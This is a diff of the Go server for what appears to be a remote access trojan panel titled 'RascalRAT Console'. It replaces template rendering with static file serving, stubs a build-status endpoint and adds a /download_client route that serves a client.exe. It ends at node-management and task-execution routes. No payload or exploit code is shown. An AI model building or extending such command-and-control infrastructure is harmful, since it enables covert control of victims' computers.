@@ -4,11 +4,10 @@ import (
 	"context"
 	"errors"
 	"fmt"
-	"html/template"
-	"io"
 	"net/http"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"strings"
 	"syscall"
 	"time"
@@ -18,18 +17,10 @@ import (
 
 	"log/slog"
 
+	"github.com/joho/godotenv"
 	"github.com/labstack/echo/v5"
 	"github.com/labstack/echo/v5/middleware"
-	"github.com/joho/godotenv"
 )
-
-type TemplateRenderer struct {
-	templates *template.Template
-}
-
-func (r *TemplateRenderer) Render(c *echo.Context, w io.Writer, name string, data any) error {
-	return r.templates.ExecuteTemplate(w, name, data)
-}
 
 func main() {
 	godotenv.Load(".env")
@@ -42,7 +33,6 @@ func main() {
 	slog.SetDefault(logger)
 
 	e := echo.New()
-	e.Renderer = &TemplateRenderer{templates: template.Must(template.ParseGlob("templates/*.html"))}
 	e.Use(middleware.RequestLogger())
 	e.Use(middleware.Recover())
 
@@ -59,10 +49,32 @@ func main() {
 	applyAuthMiddleware(e)
 
 	// Operational REST Endpoints
+	e.GET("/assets/*file", echo.WrapHandler(http.StripPrefix("/assets/", http.FileServer(http.Dir("public")))))
 	e.GET("/", func(c *echo.Context) error {
-		return c.Render(http.StatusOK, "index.html", map[string]any{"Title": "RascalRAT Console"})
+		return c.File("public/index.html")
 	})
 	e.GET("/status", handleStatus)
+
+	// Build endpoints removed - client is built during docker build when BUILD_CLIENT=1
+
+	e.GET("/build_status", func(c *echo.Context) error {
+		resp := map[string]string{
+			"status": "idle",
+			"error":  "",
+			"output": "Build endpoints removed. Client is built during docker build when BUILD_CLIENT=1.",
+		}
+		return c.JSON(http.StatusOK, resp)
+	})
+
+	e.GET("/download_client", func(c *echo.Context) error {
+		artifact := filepath.Join("bin", "client.exe")
+
+		if _, err := os.Stat(artifact); os.IsNotExist(err) {
+			return c.JSON(http.StatusNotFound, map[string]string{"error": "Client binary not found. Build the Docker image with BUILD_CLIENT=1 to include client.exe."})
+		}
+
+		return c.Attachment(artifact, "client.exe")
+	})
 
 	// Node Management and Task Execution Endpoints
 	e.GET("/nodes", func(c *echo.Context) error {
